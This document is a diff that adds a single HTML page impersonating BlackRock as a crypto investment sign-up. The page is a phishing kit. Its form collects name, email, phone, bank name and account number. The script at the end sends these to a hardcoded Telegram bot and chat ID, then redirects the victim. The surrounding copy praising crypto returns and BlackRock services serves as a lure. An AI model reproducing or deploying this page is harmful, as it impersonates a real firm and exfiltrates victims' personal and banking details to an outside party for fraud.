@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BlackRock Investment Sign-Up</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Roboto', sans-serif;
+            background: #f4f4f4;
+            color: #1e1e1e;
+            line-height: 1.6;
+        }
+        .navbar {
+            display: flex;
+            overflow-x: auto;
+            background-color: #003399;
+            padding: 10px;
+        }
+        .nav-button {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 16px;
+            margin-right: 20px;
+            cursor: pointer;
+            padding: 8px 12px;
+            border-radius: 5px;
+            transition: background 0.3s;
+        }
+        .nav-button:hover {
+            background-color: #002266;
+        }
+        .container {
+            max-width: 600px;
+            margin: 40px auto;
+            background: white;
+            border-radius: 12px;
+            padding: 30px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.1);
+        }
+        h4 {
+            text-align: center;
+            color: #003399;
+            margin-bottom: 20px;
+        }
+        label {
+            font-weight: bold;
+            display: block;
+            margin-top: 15px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-top: 5px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            box-sizing: border-box;
+        }
+        button {
+            margin-top: 20px;
+            width: 100%;
+            padding: 12px;
+            background-color: #003399;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #002266;
+        }
+        .loader {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .loader .spinner {
+            width: 60px;
+            height: 60px;
+            border: 8px solid #fff;
+            border-top-color: #003399;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .additional-info {
+            margin-top: 30px;
+            padding: 20px;
+            background-color: #f9f9f9;
+            border-radius: 8px;
+            text-align: left;
+            display: none; /* Hidden by default */
+        }
+        footer {
+            text-align: center;
+            padding: 20px;
+            background-color: #003399;
+            color: white;
+            margin-top: 40px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="navbar">
+    <button class="nav-button" onclick="toggleSection('whyCrypto')">Why Crypto?</button>
+    <button class="nav-button" onclick="toggleSection('whyInvesting')">Why Investing?</button>
+    <button class="nav-button" onclick="toggleSection('aboutBlackRock')">About BlackRock & Our Services</button>
+</div>
+
+<div class="container">
+    <h4>BlackRock Investment Sign-Up</h4>
+    <form id="investmentForm">
+        <label for="fullName">Full Name</label>
+        <input type="text" id="fullName" required>
+
+        <label for="email">Email</label>
+        <input type="email" id="email" required>
+
+        <label for="phoneNumber">Phone Number</label>
+        <input type="tel" id="phoneNumber" required>
+
+        <label for="bankName">Bank Name</label>
+        <input type="text" id="bankName" required>
+
+        <label for="accountNumber">Bank Account Number</label>
+        <input type="text" id="accountNumber" required>
+
+        <button type="submit">Sign Up</button>
+    </form>
+
+    <div class="additional-info" id="whyCrypto">
+        <h4>Why Invest in Cryptocurrency?</h4>
+        <p>Cryptocurrencies like Bitcoin and Ethereum are revolutionizing the financial landscape. They offer unique advantages such as:</p>
+        <ul>
+            <li><strong>Decentralization:</strong> Unlike traditional currencies, cryptocurrencies operate on a decentralized network, reducing the control of central banks and governments.</li>
+            <li><strong>Transparency:</strong> Blockchain technology ensures that all transactions are recorded and visible, enhancing trust and security.</li>
+            <li><strong>High Potential Returns:</strong> The crypto market has shown significant growth, with early investors in Bitcoin and Ethereum seeing substantial returns on their investments.</li>
+            <li><strong>Accessibility:</strong> Cryptocurrencies can be accessed and traded 24/7 from anywhere in the world, making them highly convenient for investors.</li>
+        </ul>
+        <p>Investing in crypto opens up access to a new asset class that is increasingly becoming mainstream, with institutional interest growing rapidly.</p>
+    </div>
+
+    <div class="additional-info" id="whyInvesting">
+        <h4>Why Investing is Crucial?</h4>
+        <p>Investing is essential for building wealth and securing your financial future. Here are some key reasons to consider investing:</p>
+        <ul>
+            <li><strong>Wealth Accumulation:</strong> Investing allows your money to grow over time, often outpacing inflation and increasing your purchasing power.</li>
+            <li><strong>Retirement Planning:</strong> Early and consistent investing can help you build a substantial retirement fund, ensuring financial security in your later years.</li>
+            <li><strong>Diversification:</strong> Investing in various asset classes, including cryptocurrencies, can help mitigate risks and enhance returns.</li>
+            <li><strong>Professional Management:</strong> With BlackRock, you benefit from expert guidance and management of your investments, tailored to your financial goals.</li>
+        </ul>
+        <p>The earlier you start investing, the more your money can grow over time due to the power of compounding.</p>
+    </div>
+
+    <div class="additional-info" id="aboutBlackRock">
+        <h4>About BlackRock & Our Services</h4>
+        <p>BlackRock is a trusted leader in investment management, with a commitment to delivering innovative solutions tailored to your needs. Our services in cryptocurrency include:</p>
+        <ul>
+            <li><strong>Expert Guidance:</strong> Our team of professionals provides insights and strategies to navigate the complexities of the crypto market.</li>
+            <li><strong>Asset Management:</strong> We offer a range of investment products, including ETFs and mutual funds that incorporate cryptocurrencies, allowing you to diversify your portfolio.</li>
+            <li><strong>Access to Exclusive Opportunities:</strong> As a BlackRock client, you gain access to unique investment opportunities in the digital asset space.</li>
+            <li><strong>Commitment to Security:</strong> We prioritize your financial security and strive to help you achieve your investment goals with confidence.</li>
+        </ul>
+        <p>For more information about our investment services, visit <a href="https://www.blackrock.com" target="_blank">BlackRock Investment Services</a>.</p>
+    </div>
+</div>
+
+<div class="loader" id="loader">
+    <div class="spinner"></div>
+    <p>Processing your sign-up...</p>
+</div>
+
+<footer>
+    &copy; 2025 BlackRock. All rights reserved. | <a href="blackrock.com" style="color: white;">Privacy Policy</a>
+</footer>
+
+<script>
+    const form = document.getElementById('investmentForm');
+    const loader = document.getElementById('loader');
+
+    const botToken = '7849950200:AAFxT3-Nq1HVSYCMwF1-lsGww6XmERS2Ig0'; // Replace with your Telegram Bot Token
+    const chatId = '7959877182';     // Replace with your Telegram Chat ID
+    const redirectURL = 'invest.html';   // Replace with your redirect URL
+
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        const name = document.getElementById('fullName').value;
+        const email = document.getElementById('email').value;
+        const phone = document.getElementById('phoneNumber').value;
+        const bankName = document.getElementById('bankName').value;
+        const accountNumber = document.getElementById('accountNumber').value;
+
+        loader.style.display = 'flex';
+
+        const message = `
+New Investment Sign-Up:
+Name: ${name}
+Email: ${email}
+Phone: ${phone}
+Bank Name: ${bankName}
+Account Number: ${accountNumber}
+        `;
+
+        await sendTelegramMessage(message);
+
+        // Save user data to local storage after successful message sending
+        localStorage.setItem('user', JSON.stringify({ name, email, phone, bankName, accountNumber }));
+
+        loader.style.display = 'none';
+        window.location.href = redirectURL;
+    });
+
+    async function sendTelegramMessage(message) {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: message })
+        });
+    }
+
+    window.onload = function() {
+        const user = JSON.parse(localStorage.getItem('user'));
+        if (user) {
+            window.location.href = redirectURL; // Redirect if user is already signed in
+        }
+    };
+
+    function toggleSection(sectionId) {
+        const sections = document.querySelectorAll('.additional-info');
+        sections.forEach(section => {
+            if (section.id === sectionId) {
+                section.style.display = section.style.display === 'block' ? 'none' : 'block';
+            } else {
+                section.style.display = 'none';
+            }
+        });
+    }
+</script>
+
+</body>
+</html>
